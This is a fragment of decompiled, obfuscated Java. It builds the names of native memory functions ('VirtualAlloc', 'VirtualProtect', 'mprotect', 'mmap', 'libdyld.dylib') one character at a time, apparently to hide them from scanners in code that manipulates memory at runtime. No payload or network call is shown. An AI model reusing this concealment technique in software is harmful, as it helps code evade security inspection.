               var11.printStackTrace();
            }
         }
      }

      for(int var18 = 0; var18 < 5; ++var18) {
         try {
            if (l.n((Object)null) == null) {
               l.a.remove(Properties.class);
               return true;
            }
         } catch (Throwable var9) {
         }

         try {
            Thread.sleep(200L);
         } catch (InterruptedException var8) {
         }
      }

      l.a.remove(Properties.class);
      return false;
   }

   private static String a() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('p');
      var0.append('i');
      var0.append('d');
      return var0.toString();
   }

   private static String b() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('V');
      var0.append('i');
      var0.append('r');
      var0.append('t');
      var0.append('u');
      var0.append('a');
      var0.append('l');
      var0.append('P');
      var0.append('r');
      var0.append('o');
      var0.append('t');
      var0.append('e');
      var0.append('c');
      var0.append('t');
      return var0.toString();
   }

   private static String c() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('V');
      var0.append('i');
      var0.append('r');
      var0.append('t');
      var0.append('u');
      var0.append('a');
      var0.append('l');
      var0.append('A');
      var0.append('l');
      var0.append('l');
      var0.append('o');
      var0.append('c');
      return var0.toString();
   }

   private static String d() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('l');
      var0.append('i');
      var0.append('b');
      var0.append('d');
      var0.append('y');
      var0.append('l');
      var0.append('d');
      var0.append('.');
      var0.append('d');
      var0.append('y');
      var0.append('l');
      var0.append('i');
      var0.append('b');
      return var0.toString();
   }

   private static String e() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('V');
      var0.append('i');
      var0.append('r');
      var0.append('t');
      var0.append('u');
      var0.append('a');
      var0.append('l');
      var0.append('F');
      var0.append('r');
      var0.append('e');
      var0.append('e');
      return var0.toString();
   }

   private static String f() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('m');
      var0.append('u');
      var0.append('n');
      var0.append('m');
      var0.append('a');
      var0.append('p');
      return var0.toString();
   }

   private static String g() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('m');
      var0.append('p');
      var0.append('r');
      var0.append('o');
      var0.append('t');
      var0.append('e');
      var0.append('c');
      var0.append('t');
      return var0.toString();
   }

   private static String h() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('m');
      var0.append('m');
      var0.append('a');
      var0.append('p');
      return var0.toString();
   }
}
